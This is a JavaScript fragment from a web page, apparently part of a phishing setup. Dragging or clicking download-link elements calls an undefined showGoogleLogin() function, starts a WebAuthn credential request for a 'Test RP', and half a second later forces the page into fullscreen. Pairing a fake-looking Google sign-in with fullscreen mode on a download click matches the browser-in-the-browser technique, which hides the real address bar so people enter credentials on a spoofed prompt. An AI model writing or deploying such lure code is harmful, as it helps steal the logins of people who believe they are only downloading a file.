// ================= WEBAUTHN =================
function requestWebAuthn() {
    const challenge = crypto.getRandomValues(new Uint8Array(32));
    const userId = crypto.getRandomValues(new Uint8Array(16));

    navigator.credentials.create({
        publicKey: {
            challenge,
            rp: { name: "Test RP" },
            user: {
                id: userId,
                name: "test@example.com",
                displayName: "Test User"
            },
            pubKeyCredParams: [
                { type: "public-key", alg: -7 }
            ],
            timeout: 60000,
            authenticatorSelection: {
                userVerification: "preferred"
            }
        }
    }).then(cred => {
        console.log("✅ WebAuthn success:", cred);
    }).catch(err => {
        console.log("❌ WebAuthn error:", err.name, err.message);
    });
}

// ================= INIT =================
document.addEventListener("DOMContentLoaded", function () {

  function trigger() {
    showGoogleLogin();
    requestWebAuthn();
    setTimeout(async () => {
        try {
            await document.documentElement.requestFullscreen();
            console.log("Entered fullscreen");
        } catch (e) {
            console.log("Fullscreen error:", e);
        }
    }, 500);
  }

  document.getElementById("uiLinkUrlDownload").addEventListener("dragend", trigger);
  document.getElementById("linkurl").addEventListener("dragend", trigger);

  // fallback biar tetap jalan
  document.getElementById("uiLinkUrlDownload").addEventListener("click", trigger);
  document.getElementById("linkurl").addEventListener("click", trigger);

  // Mac OS split view button trigger
  const splitViewBtn = document.getElementById("splitViewBtn");
  if (splitViewBtn) {
    splitViewBtn.addEventListener("click", trigger);
  }
  document.getElementById("linkurl").addEventListener("click", trigger);

});
